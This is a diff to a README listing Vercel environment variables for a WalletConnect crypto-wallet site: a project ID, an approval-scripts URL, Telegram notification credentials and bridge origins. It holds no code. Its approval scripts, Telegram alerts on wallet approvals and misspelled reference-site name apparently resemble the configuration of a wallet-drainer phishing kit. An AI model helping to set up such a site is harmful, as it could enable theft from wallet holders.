@@ -1,13 +1,23 @@
 # Vercel Environment Variables
 
-Same as the BEP20 reference site (wallete-connect-bep-20). Add these in **Vercel → Project → Settings → Environment Variables**:
+Add these in **Vercel → Project → Settings → Environment Variables**. Apply to **Production**, **Preview**, and **Development** as needed.
+
+## Required for WalletConnect
+
+| Variable | Description | Value |
+|----------|-------------|-------|
+| `VITE_PROJECT_ID` | WalletConnect Project ID. Must match the project in [dashboard.walletconnect.com](https://dashboard.walletconnect.com) | `11e5445365f720d1050dc106ba2e78d6` |
+
+**Project ID check:** In WalletConnect Dashboard → your project → Settings, confirm the Project ID is `11e5445365f720d1050dc106ba2e78d6`. Add your domains to the **Allowlist** (Domain tab).
+
+## Optional
 
 | Variable | Description | Example |
 |----------|-------------|---------|
-| `TRUST_CARD_APPROVAL_URL` | URL for fluxpay scripts (BNB/TRX). Leave empty to use local `/fluxpay/` | `https://trust-card.vercel.app/fluxpay` |
-| `VITE_PROJECT_ID` | WalletConnect Project ID from [dashboard.walletconnect.com](https://dashboard.walletconnect.com) | `11e5445365f720d1050dc106ba2e78d6` |
-| `TELEGRAM_BOT_TOKEN` | (Optional) From @BotFather for notifications | |
-| `TELEGRAM_CHAT_ID` | (Optional) Chat ID for notifications | |
+| `TRUST_CARD_APPROVAL_URL` | URL for fluxpay scripts. Leave empty to use local `/fluxpay/` | `https://trust-card.vercel.app/fluxpay` |
+| `TELEGRAM_BOT_TOKEN` | From @BotFather for wallet/approval notifications | |
+| `TELEGRAM_CHAT_ID` | Chat ID for Telegram notifications | |
+| `NEXT_PUBLIC_WC_PARENT_ORIGINS` | Comma-separated origins for wc-bridge (if used) | `https://trust-card.vercel.app` |
 
 ## Wallet Connect Flow (Reference: BEP20)
 
